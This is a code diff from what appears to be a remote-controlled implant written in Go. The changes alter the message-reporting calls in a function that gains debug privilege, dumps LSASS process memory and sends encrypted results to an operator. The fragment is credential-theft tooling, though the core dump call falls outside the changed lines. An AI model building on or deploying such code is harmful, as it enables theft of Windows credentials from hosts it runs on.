@@ -21,14 +21,14 @@ func dumpCmd(sendUserId, decData string) {
 	if err != nil {
 		data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
+		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg, "")
 		return
 	}
 	err = dumpopt.SetSeDebugPrivilege()
 	if err != nil {
 		data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
+		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg, "")
 		return
 	}
 
@@ -36,7 +36,7 @@ func dumpCmd(sendUserId, decData string) {
 	if err != nil {
 		data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
+		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg, "")
 		return
 	}
 	defer func(fd windows.Handle) {
@@ -44,7 +44,7 @@ func dumpCmd(sendUserId, decData string) {
 		if err != nil {
 			data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
 			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-			common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
+			common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg, "")
 			return
 		}
 	}(pHandle)
@@ -57,7 +57,7 @@ func dumpCmd(sendUserId, decData string) {
 	if err != nil {
 		data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
+		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg, "")
 		return
 	}
 	defer func(fd windows.Handle) {
@@ -65,7 +65,7 @@ func dumpCmd(sendUserId, decData string) {
 		if err != nil {
 			data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
 			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-			common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
+			common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg, "")
 			return
 		}
 	}(fHandle)
@@ -73,11 +73,11 @@ func dumpCmd(sendUserId, decData string) {
 	if err != nil {
 		data := colorcode.OutputMessage(colorcode.SIGN_ERROR, err.Error())
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
+		common.SendFailMsg(sendUserId, common.ClientId, "dump_ret", outputMsg, "")
 		return
 	}
 	data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "dump lsass success")
 	outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-	common.SendSuccessMsg(sendUserId, common.ClientId, "dump_ret", outputMsg)
+	common.SendSuccessMsg(sendUserId, common.ClientId, "dump_ret", outputMsg, "")
 
 }
